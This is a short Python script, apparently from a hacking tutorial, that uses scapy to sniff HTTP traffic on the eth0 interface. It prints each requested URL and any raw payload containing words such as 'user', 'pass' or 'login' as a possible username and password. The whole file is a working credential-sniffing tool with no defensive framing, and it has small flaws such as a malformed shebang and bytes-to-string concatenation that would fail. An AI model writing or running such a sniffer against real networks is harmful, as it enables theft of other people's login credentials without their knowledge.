#/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

keywords = ["email", "user", "admin", "name", "pass", "login", "name", "word"]

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
  if packet.haslayer(scapy.Raw):
    load = str(packet[scapy.Raw].load)
    for keyword in keywords:
        if keyword in load.lower():
            return load
  return None

def process_sniffed_packet(packet):
    # print(packet.show())
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request for URL: " + url.decode())

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Keyword Found in load.  Possible username/password: ")
            print(login_info + "\n\n")

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

sniff("eth0")

